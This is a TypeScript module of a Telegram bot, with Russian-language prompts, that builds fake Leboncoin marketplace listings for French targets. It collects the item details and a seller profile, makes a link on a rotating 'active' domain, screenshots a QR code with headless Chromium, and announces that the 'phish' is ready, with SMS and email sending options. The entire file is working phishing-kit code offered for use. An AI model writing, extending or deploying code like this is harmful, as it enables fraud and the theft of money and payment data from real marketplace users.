import {Context} from "@/database/models/context";
import {Scene} from "grammy-scenes";
import {Composer, InlineKeyboard} from "grammy";
import {deleteAllMessages} from "@/helpers/deleteAllMessages";
import {Ads} from "@/database/models/ads";
import {adsRepository, domensRepository, profilesRepository} from "@/database";
import {getPictureMenu} from "@/helpers/getPictureMenu";
import moment from "moment/moment";
import {User} from "@/database/models/user";
import {getFlagEmoji} from "@/helpers/getFlagEmoji";
import console from "console";
const { chromium } = require('playwright');

export const composer = new Composer<Context>()
const regex = /^ad manual creation leboncoin/gmi
composer.callbackQuery(regex, startScene)

async function startScene(ctx: Context) {
    const profiles = await profilesRepository.find({
        relations: { user: true },
        where: {
            service: 'leboncoin',
            country: 'fr',
            user: {
                tgId: ctx.user.tgId
            }
        }
    })
    if (profiles.length === 0) {
        await ctx.reply(`
<b>${getFlagEmoji('fr')} LEBONCOIN</b>
Создай профиль для этой площадки и заново спарси ссылку`, {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
        return cancel(ctx)
    }
    return ctx.scenes.enter('manualCreationAd-LebonCoin')
}

export const scene = new Scene<Context>('manualCreationAd-LebonCoin')

async function cancel (ctx) {
    await deleteAllMessages(ctx.session.deleteMessage,ctx)
    ctx.scene.exit()
}

scene.always().callbackQuery('cancel manualCreationAd-LebonCoin', cancel)

scene.do(async (ctx) => {
    ctx.session.createAdManual = {}
    ctx.session.deleteMessage = []
    ctx.session.service = 'leboncoin'

    const res = await ctx.reply(`<b>🇫🇷 Введи название товара:</b>`, {
        reply_markup: {
            inline_keyboard: [
                [{text: 'Отмена', callback_data: 'cancel manualCreationAd-LebonCoin'}]
            ]
        }
    })
    ctx.session.deleteMessage.push(res.message_id)
    ctx.session.tgId = res.message_id
    ctx.scene.resume()
})

scene.wait().hears(/(^.+)/, async ctx => {
    ctx.session.deleteMessage.push(ctx.msg.message_id)
    ctx.session.createAdManual.title = ctx.message.text

    const res = await ctx.reply(`<b>💶 Введи цену товара (только цифры):</b>`, {
        reply_markup: {
            inline_keyboard: [
                [{text: 'Отмена', callback_data: 'cancel manualCreationAd-LebonCoin'}]
            ]
        }
    })
    ctx.session.deleteMessage.push(res.message_id)

    ctx.scene.resume()
})

scene.wait().hears(/(^.+)/, async ctx => {
    ctx.session.deleteMessage.push(ctx.msg.message_id)
    ctx.session.createAdManual.price = ctx.match[1]

    const res = await ctx.reply(`<b>🚚 Введи цену за доставку товара (только цифры):</b>`, {
        reply_markup: {
            inline_keyboard: [
                [{text: 'Отмена', callback_data: 'cancel manualCreationAd-LebonCoin'}]
            ]
        }
    })
    ctx.session.deleteMessage.push(res.message_id)

    ctx.scene.resume()
})

scene.wait().hears(/(^\d+)/, async ctx => {
    ctx.session.deleteMessage.push(ctx.msg.message_id)

    let price = Number(ctx.session.createAdManual.price)
    const deliveryPrice = Number(ctx.match[1])
    price += deliveryPrice
    ctx.session.createAdManual.price = price + ' €'
    ctx.session.createAdManual.deliveryPrice = ctx.match[1] + ' €'

    const res = await ctx.reply(`<b>💬 Введи описание товара:</b>`, {
        reply_markup: {
            inline_keyboard: [
                [{text: 'Отмена', callback_data: 'cancel manualCreationAd-LebonCoin'}]
            ]
        }
    })
    ctx.session.deleteMessage.push(res.message_id)

    ctx.scene.resume()
})

scene.wait().hears(/(^.+)/, async ctx => {
    ctx.session.deleteMessage.push(ctx.msg.message_id)
    ctx.session.createAdManual.description = ctx.msg.text

    const res = await ctx.reply(`<b>🌌 Скинь изображение товара:</b>`, {
        reply_markup: {
            inline_keyboard: [
                [{text: 'Отмена', callback_data: 'cancel manualCreationAd-LebonCoin'}]
            ]
        }
    })
    ctx.session.deleteMessage.push(res.message_id)

    ctx.session.tgId = res.message_id
    ctx.scene.resume()
})

scene.wait().on('message:photo', async ctx => {
    const res = await ctx.getFile()
    ctx.session.deleteMessage.push(ctx.msg.message_id)

    ctx.session.createAdManual.img = res.file_path

    ctx.scene.resume()
})

scene.do( async ctx => {
    ctx.session.deleteMessage.push(ctx.msg.message_id)
    const keyboard = new InlineKeyboard()

    const profiles = await profilesRepository.find({
        relations: { user: true },
        where: {
            service: 'leboncoin',
            country: 'fr',
            user: {
                tgId: ctx.user.tgId
            }
        }
    })
    if (profiles.length === 0) {
        await ctx.reply(`
<b>${getFlagEmoji('fr')} LEBONCOIN</b>
Создай профиль для этой площадки и заново спарси ссылку`, {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
        return cancel(ctx)
    }
    profiles.slice(0,9)
    for (const i in profiles) {
        const profile = profiles[i]
        if (i === '3' || i === '6' || i === '9') { keyboard.row() }
        keyboard.text(`${(profile.fullName.length > 9) ? profile.fullName.slice(0,9) + '...' : profile.fullName}`, `set profile ${profile.id}`)
        console.log(`set profile ${profile.id}`)

    }
    const res = await ctx.reply(`Выбери профиль для <b>${getFlagEmoji("fr")} LEBONCOIN</b>`, {
        reply_markup: keyboard
    })
    ctx.session.deleteMessage.push(res.message_id)
})

scene.wait().callbackQuery(/set profile (?<id>\d+)/,async ctx => {
    const domen = await domensRepository.findOneBy({active: true, service: `leboncoin`})
    if (!domen) return ctx.reply('domen undefined error')

    const match = /set profile (?<id>\d+)/.exec(ctx.callbackQuery.data)

    const profile = await profilesRepository.findOne({
        where: {id: Number(match.groups.id)}
    })

    const date = Date.now()
    const ad = new Ads()
    ad.price = ctx.session.createAdManual.price
    ad.title = ctx.session.createAdManual.title
    ad.description = ctx.session.createAdManual.description
    ad.img = ctx.session.createAdManual.img
    ad.profile = profile
    ad.link = `offre/2333383018-${date}`
    ad.originallink = 'none'
    ad.deliveryPrice = ctx.session.createAdManual.deliveryPrice
    ad.date = `${date}`
    ad.country = 'fr'
    ad.service = 'leboncoin'
    ad.author = ctx.user
    ad.manualCreation = true
    await adsRepository.save(ad)
    let msg = await ctx.reply('⏳ Создание qr...')
    try {
        const browser = await chromium.launch({
            args: ['--disable-dev-shm-usage', '--no-sandbox'],
        });
        const context = await browser.newContext();
        const page = await context.newPage();
        await page.goto(`https://${domen.link}/link/${ad.link}?qrcode=true`);
        await page.screenshot({ path: `temp/qrcode_${ad.date}.png` });
    } catch (e) {
        console.log(e)
    }
    try {
        await ctx.api.deleteMessage(ctx.chat.id,msg.message_id)
    } catch (e) {
        console.log(e)
    }
    await ctx.replyWithPhoto(await getPictureMenu(ctx.user), {
        caption:`
Фиш готов 👌

🆔 ID: <code>${ad.date}</code>

📦 <b>Товар:</b> <code>${ad.title}</code>
💸 <b>Цена:</b> <code>${ad.price}</code>
💡 <b>Платформа: LEBONCOIN [FR 🇫🇷]</b>
♻️ <b>Домен сменён ${moment(new Date(domen.dateChange)).fromNow()}</b>
➖➖➖➖➖➖➖
🌠 <b>Созданная ссылка:</b> <a href="https://${domen.link}/link/${ad.link}">LINK [2.0]</a>
`.replace('\n', ''),
        reply_markup: await createKeyboard(ad.id, ctx.user)
    })
    ctx.scene.exit()
})

const createKeyboard = async (id: Number, user: User) => {
    const keyb = new InlineKeyboard()
    // .text("🙊 Настройки", `settings ad ${id}`)

    keyb.row()

    keyb.text("📲 SMS", `sms ad ${id}`)
    keyb.text("💌 EMAIL", `email ad ${id}`)

    keyb.row()
    keyb.text("🎲 QR-code", `qrcode get ${id}`)
    keyb.text("⚙ Настройки", `settings ad ${id}`)
    keyb.row()
    keyb.text("Главное меню", `menuWithPicture`)

    return keyb

}
